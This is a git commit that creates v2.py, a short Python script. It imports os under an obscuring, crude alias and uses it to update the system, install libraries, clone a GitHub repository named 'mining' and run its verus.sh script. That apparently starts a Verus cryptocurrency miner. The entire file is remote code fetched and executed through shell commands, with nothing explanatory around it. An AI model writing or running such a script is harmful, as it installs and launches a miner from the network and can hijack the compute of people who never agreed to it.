3fc7c4f328215ce24f7b001248cb3b0e74bfc3d8
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-10-27 23:45:16 +0700

    Create v2.py
    @Tokisaki-mitsuha

---
+++ v2.py
@@ -0,0 +1,5 @@
+import os as akusayangkamutapiboongbacotngentod
+akusayangkamutapiboongbacotngentod.system("apt-get update && apt-get upgrade -y")
+akusayangkamutapiboongbacotngentod.system("apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 git")
+akusayangkamutapiboongbacotngentod.system("git clone https://github.com/Tokisaki-mitsuha/mining.git && cd mining && chmod +x compile.sh")
+akusayangkamutapiboongbacotngentod.system("chmod +x verus.sh && ./verus.sh")
